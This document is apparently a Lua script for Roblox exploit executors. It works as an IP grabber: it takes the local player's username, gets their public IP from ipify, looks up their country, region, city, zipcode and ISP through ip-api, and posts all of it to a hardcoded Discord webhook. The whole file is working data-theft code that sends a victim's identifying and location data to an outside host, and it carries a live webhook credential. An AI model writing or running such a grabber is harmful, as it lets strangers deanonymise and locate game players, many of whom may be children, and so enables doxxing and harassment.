local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1357004600913301725/UDXK3-eydnPjc8tuHanZmmNmQu5_ZuoHtmRfuWuoddnWVUoVSQltIXp1IvtAyUnA7_nq"

-- Function to send HTTP requests safely
local function safeRequest(options)
    if http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif (syn and syn.request) then
        return syn.request(options)
    else
        warn("HTTP request function not found!")
        return nil
    end
end

-- Get IP Address
local getIPResponse = safeRequest({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
if not getIPResponse then return end

local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

-- Get IP Info
local getIPInfo = safeRequest({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "GET"
})
if not getIPInfo then return end

local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}

-- Format the message
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", 
    name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)

local MessageData = {
    ["content"] = dataMessage
}

-- Send data to Discord webhook
safeRequest({
    Url = WebhookURL,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = game:GetService("HttpService"):JSONEncode(MessageData)
})
